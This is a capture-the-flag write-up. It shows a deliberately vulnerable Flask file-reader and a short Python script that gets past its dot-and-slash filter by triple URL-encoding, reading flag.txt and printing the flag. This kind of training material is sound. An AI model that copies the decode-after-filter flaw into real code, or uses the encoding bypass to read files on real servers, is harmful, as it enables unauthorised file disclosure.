# Beginner - secret_of_j4ck4l
## Writeup Author: kebabulon

---

### Task

I left a message for you. You will love it definitely

http://34.132.132.69:8003/

**public.zip**:

```
-- app
   |-- app.py
   |-- docker-compose.yaml
   |-- Dockerfile
   |-- flag.txt
   |-- message 
       |-- message
```

---

### Solution

Let's check out ```app.py```:

```py
from flask import Flask, request, render_template_string, redirect
import os
import urllib.parse

app = Flask(__name__)

base_directory = "message/"
default_file = "message.txt"

def ignore_it(file_param):
    yoooo = file_param.replace('.', '').replace('/', '')
    if yoooo != file_param:
        return "Illegal characters detected in file parameter!"
    return yoooo

def another_useless_function(file_param):
    return urllib.parse.unquote(file_param)

def url_encode_path(file_param):
    return urllib.parse.quote(file_param, safe='')

def useless (file_param):
    file_param1 = ignore_it(file_param)
    file_param2 = another_useless_function(file_param1)
    file_param3 = ignore_it(file_param2)
    file_param4 = another_useless_function(file_param3)
    file_param5 = another_useless_function(file_param4)
    return file_param5


@app.route('/')
def index():
    return redirect('/read_secret_message?file=message')

@app.route('/read_secret_message')
def read_file(file_param=None):
    file_param = request.args.get('file')
    file_param = useless(file_param)
    print(file_param)
    file_path = os.path.join(base_directory, file_param)

    try:
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    except FileNotFoundError:
        return 'File not found! or maybe illegal characters detected'
    except Exception as e:
        return f'Error: {e}'


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=4053)
```

We have to do path traversal, but we can't use plain text ```.``` or ```/``` because of the function ```ignore_it()```.  
Instead, we are going to URL encode the dot and the slash.

The URL is unquoted 3 times in the function ```useless()```, so all we have to do is quote our path 3 times:

```py
import urllib.parse
def url_encode(file_param):
    return urllib.parse.quote(file_param, safe='')

dot = url_encode(url_encode(url_encode(".")))
slash = url_encode(url_encode(url_encode("/")))

path = dot + dot + slash + 'flag' + dot + 'txt'

import requests
r = requests.get('http://34.132.132.69:8003/read_secret_message?file='+path)

print(r.text)
```

And we get the flag.

---

### Flag

```
flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}
```

